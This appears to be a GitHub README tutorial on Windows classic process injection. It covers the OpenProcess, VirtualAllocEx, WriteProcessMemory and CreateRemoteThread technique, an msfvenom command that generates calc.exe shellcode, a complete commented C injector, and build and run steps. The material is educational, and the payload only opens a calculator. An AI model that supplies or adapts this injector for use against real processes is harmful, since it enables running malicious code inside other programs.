# Classic Injection

---

# ℹ️ What is Classic Process Injection?

**Windows Classic Process Injection** refers to traditional techniques for injecting and executing arbitrary code inside another process on the Windows operating system. These methods leverage well-documented and widely available Windows API functions, making them popular among both attackers and security researchers.

---

## 📌 Key Characteristics:
- Based on **standard Windows APIs**.
- Common in malware, penetration testing, and red team tools.
- Often detected by modern security solutions (AV/EDR).
- Easy to implement and ideal for learning.

---

## 📚 Core Windows APIs Used:
| API                  | Purpose                                      |
|----------------------|---------------------------------------------|
| `OpenProcess`        | Opens a handle to the target process.        |
| `VirtualAllocEx`     | Allocates memory within the target process.  |
| `WriteProcessMemory` | Writes the shellcode or payload into memory. |
| `CreateRemoteThread` | Creates a thread in the target process to execute the payload. |

---

## 🔍 Common Classic Injection Techniques:
1. **CreateRemoteThread + WriteProcessMemory Injection:**  
   Most popular method for injecting shellcode or DLLs.
   
2. **LoadLibrary Injection:**  
   Injects a DLL by passing its path to `LoadLibrary` via a remote thread.

3. **Shellcode Injection (Manual Mapping Basics):**  
   Direct injection and execution of shellcode in the remote process memory.

---

## 📜 Why Is It Called "Classic"?
These methods are referred to as **classic** because they are among the earliest and simplest process injection techniques ever documented. Despite being old, they are still widely studied and used as the foundation for more advanced injection methods.

---

## ✅ Advantages:
- Easy to understand and implement.
- Great for learning about process memory and Windows internals.
- Useful for proof-of-concept (PoC) demonstrations.

---

## ⚠️ Limitations:
- Easily detectable by modern security tools.
- Lacks built-in stealth or evasion techniques.
- Requires OPSEC enhancements for real-world red team use.

---

## 🚨 Disclaimer:
This document and the techniques described are intended for **educational and research purposes only**. Unauthorized or malicious use of these techniques is strictly prohibited.

---

## 💣 Shellcode (Spawns calc.exe)


This is the shellcode used in this project (generated via msfvenom):
```powershell
msfvenom.bat -p windows/x64/exec CMD=calc.exe -f c
```
<img width="673" alt="calc-payload-1" src="https://github.com/user-attachments/assets/0992e1d4-d465-4c8c-b31f-f463e3c97049" />

---

## 🖥️  Setting Up in Visual Studio (Step by Step)

1. Open Visual Studio.

2. Click on "Create a new project."

3. Select "Empty Project" under C/C++ projects.

4. Name the project (example: Project1).

5. Click "Create."

6. In Solution Explorer:

    - Right-click on Source Files → Add → New Item.

    - Choose C File (.c) → Name it injection.c.

7. Paste your injector code (with the shellcode above) into injection.c.

## 🔍 Code Explanation — injection.c

```c
#include "Windows.h"  // Windows API header for process/memory/thread functions

int main(int argc, char *argv[]) {

    // Shellcode payload (this one spawns calc.exe, generated with msfvenom)
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"  // Raw shellcode bytes
        /* ... (rest of shellcode bytes) ... */
        "\x63\x61\x6c\x63\x00";  // Shellcode likely spawns calculator

    // Open the target process using its PID passed as a command-line argument (argv[1])
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));

    // Allocate memory inside the target process for the shellcode (read, write, execute permissions)
    LPVOID shellmem = VirtualAllocEx(
        hprocess, NULL, sizeof buf, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );

    // Write the shellcode into the allocated memory inside the target process
    WriteProcessMemory(hprocess, shellmem, buf, sizeof buf, NULL);

    // Create a new thread in the target process that starts executing the shellcode
    HANDLE malthread = CreateRemoteThread(
        hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)shellmem, NULL, 0, NULL
    );

    // Exit the injector (the injected shellcode keeps running in the target process)
    return 0;
}

```
---

## 🏗️ Build & 🚀 Execute the Project

  - Press Ctrl+Shift+B or Build → Build Solution.

## ✅ Execution:

Run a target process (like notepad.exe) manually or via terminal:

Get its Process ID (PID) using Task Manager or Process Hacker.

Run your injector from the terminal with the target PID:

```powershell
Project1.exe 4321
```
## 💥 The shellcode will now execute inside the target process, spawning calc.exe.

https://github.com/user-attachments/assets/f070e9e1-6d29-476d-92fe-e3e562e9edad


---

## Refrences:
  - https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

---
